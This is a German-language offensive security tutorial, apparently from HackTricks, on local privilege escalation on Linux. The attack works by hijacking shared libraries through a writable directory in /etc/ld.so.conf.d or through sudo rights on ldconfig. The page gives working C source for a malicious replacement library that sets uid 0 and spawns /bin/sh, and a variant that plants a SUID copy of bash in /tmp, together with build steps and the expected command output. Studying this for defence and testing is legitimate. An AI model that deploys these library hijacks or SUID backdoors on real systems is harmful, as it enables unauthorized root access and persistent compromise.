# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Umgebung vorbereiten

Im folgenden Abschnitt findest du den Code der Dateien, die wir zum Vorbereiten der Umgebung verwenden werden.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Erstelle** diese Dateien auf deinem Rechner im selben Ordner
2. **Kompiliere die** **Bibliothek**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopiere** `libcustom.so` nach `/usr/lib` und aktualisiere den Cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Kompiliere die** **ausführbare Datei**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Überprüfe die Umgebung

Überprüfe, dass _libcustom.so_ aus _/usr/lib_ **geladen** wird und dass du die Binärdatei **ausführen** kannst.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Nützliche Triage-Befehle

Beim Angriff auf ein echtes Ziel sollte der **exakte Bibliotheksname** überprüft werden, den das Binary benötigt, sowie, was der **Loader derzeit auflöst**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Ein paar nützliche Fallstricke:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` **funktioniert** normalerweise nicht, weil
die Umleitung von deiner aktuellen Shell durchgeführt wird. Verwende stattdessen
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged**-Binaries ignorieren `LD_LIBRARY_PATH`/`LD_PRELOAD` im
**secure-execution mode**, aber Verzeichnisse aus `/etc/ld.so.conf` sind weiterhin
Teil der vertrauenswürdigen Loader-Konfiguration, sodass diese Fehlkonfiguration
privilegierte Programme weiterhin beeinflussen kann.<sup>[[1]](#references)</sup>
- Bei neueren glibc-Versionen stellt der dynamische Loader außerdem
`--list-diagnostics` bereit. Das ist hilfreich, um die Cache-Auflösung und die
Auswahl von `glibc-hwcaps`-Unterverzeichnissen zu debuggen, wenn ein Hijack nicht
wie erwartet funktioniert.<sup>[[1]](#references)</sup>

## Exploit

In diesem Szenario gehen wir davon aus, dass **jemand einen verwundbaren Eintrag** in
einer Datei innerhalb von _/etc/ld.so.conf/_ erstellt hat:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Der verwundbare Ordner ist _/home/ubuntu/lib_ (auf den wir Schreibzugriff haben).\
**Lade den folgenden Code herunter und kompiliere ihn** innerhalb dieses Pfads:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Wenn du erwartest, dass **root** (oder ein anderes privilegiertes Konto) die verwundbare Binärdatei später ausführt, ist es normalerweise besser, ein **root-owned artifact** zu hinterlassen, anstatt eine interaktive Shell zu starten. Zum Beispiel:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Dann kannst du nach der Ausführung mit privilegierten Rechten `/tmp/rootbash -p` verwenden.

Nachdem wir die bösartige libcustom-Bibliothek im **fehlkonfigurierten** Pfad **erstellt** haben, müssen wir auf einen **Neustart** oder darauf warten, dass der Root-Benutzer **`ldconfig`** ausführt (_falls du diese Binary als **sudo** ausführen kannst oder sie das **suid bit** besitzt, kannst du sie selbst ausführen_).

Sobald dies geschehen ist, **überprüfe erneut**, aus welchem Pfad die ausführbare Datei `sharedvuln` die Bibliothek `libcustom.so` lädt:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Wie du sehen kannst, wird es aus **`/home/ubuntu/lib`** geladen, und wenn ein beliebiger Benutzer es ausführt, wird eine Shell ausgeführt:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Beachten Sie, dass wir in diesem Beispiel keine Privilegien eskaliert haben. Wenn wir jedoch die ausgeführten Befehle ändern und **darauf warten, dass root oder ein anderer privilegierter Benutzer die verwundbare Binärdatei ausführt**, können wir Privilegien eskalieren.

### Weitere Fehlkonfigurationen - Dieselbe Schwachstelle

Im vorherigen Beispiel haben wir eine Fehlkonfiguration vorgetäuscht, bei der ein Administrator **einen nicht privilegierten Ordner in einer Konfigurationsdatei innerhalb von `/etc/ld.so.conf.d/` festgelegt hat**.\
Es gibt jedoch weitere Fehlkonfigurationen, die dieselbe Schwachstelle verursachen können. Wenn Sie **Schreibberechtigungen** für eine **Konfigurationsdatei** innerhalb von `/etc/ld.so.conf.d`, für den Ordner `/etc/ld.so.conf.d` oder für die Datei `/etc/ld.so.conf` haben, können Sie dieselbe Schwachstelle konfigurieren und ausnutzen.

## Exploit 2

**Angenommen, Sie haben sudo-Berechtigungen für `ldconfig`**.\
Sie können angeben, **von wo `ldconfig` die Conf-Dateien laden soll**. Dies können wir ausnutzen, damit `ldconfig` beliebige Ordner lädt.<sup>[[2]](#references)</sup>\
Erstellen wir also die benötigten Dateien und Ordner, um "/tmp" zu laden:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Nun, wie im **vorherigen exploit** angegeben, **erstelle die schädliche Bibliothek innerhalb von `/tmp`**.\
Und schließlich laden wir den Pfad und überprüfen, von wo das Binary die Bibliothek lädt:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Wie Sie sehen können, kann dieselbe Schwachstelle ausgenutzt werden, wenn Sie sudo-Berechtigungen für `ldconfig` haben.**

## Referenzen

- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)

{{#include ../../banners/hacktricks-training.md}}
